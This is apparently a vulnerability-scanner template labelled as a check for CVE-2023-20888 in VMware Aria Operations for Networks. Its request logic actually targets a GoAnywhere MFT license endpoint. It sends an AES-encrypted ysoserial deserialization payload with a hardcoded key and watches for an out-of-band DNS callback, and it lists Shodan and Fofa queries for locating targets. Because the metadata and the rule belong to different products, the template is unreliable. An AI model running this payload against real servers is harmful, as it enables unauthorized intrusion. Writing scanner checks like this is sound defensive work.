id: CVE-2023-20888

info:
  name: VMware Aria Operations for Networks - Remote Code Execution
  author: iamnoooob,rootxharsh,pdresearch
  severity: high
  verified: false
  description: |
    Aria Operations for Networks contains an authenticated deserialization vulnerability. A malicious actor with network access to VMware Aria Operations for Networks and valid 'member' role credentials may be able to perform a deserialization attack resulting in remote code execution.
    Shodan: title:"VMware Aria Operations"
    Fofa: app="vmware-Aria"
  affected: |
    Successful exploitation of this vulnerability could allow an attacker to execute arbitrary code on the affected system.
  reference:
    - https://www.vmware.com/security/advisories/VMSA-2023-0012.html
    - https://nvd.nist.gov/vuln/detail/CVE-2023-20888
  tags: cve,cve2023,vmware,aria,rce,authenticated
  created: 2024/01/06

set:
  reverse: newReverse()
  reverseHost: reverse.url.host
  base64payload: ysoserial("URLDNS",reverseHost,"base64")
  payload: base64Decode(base64payload)
  key: base64Decode("Dmmjg5tuz0Vkm4YfSicXG2aHDJVnpBROuvPVL9xAZMo=")
  iv: base64Decode("QUVTL0NCQy9QS0NTNVBhZA==")
  bundle: urlencode(base64(aesCBC(payload, key, iv))) + "$2"
rules:
  r0:
    request:
      method: POST
      path: /goanywhere/lic/accept
      headers:
        Accept-Encoding: gzip, deflate
      body: |
        bundle={{bundle}}
    expression: response.status == 500 && response.body.bcontains(b'GoAnywhere') && reverse.wait(5)
expression: r0()
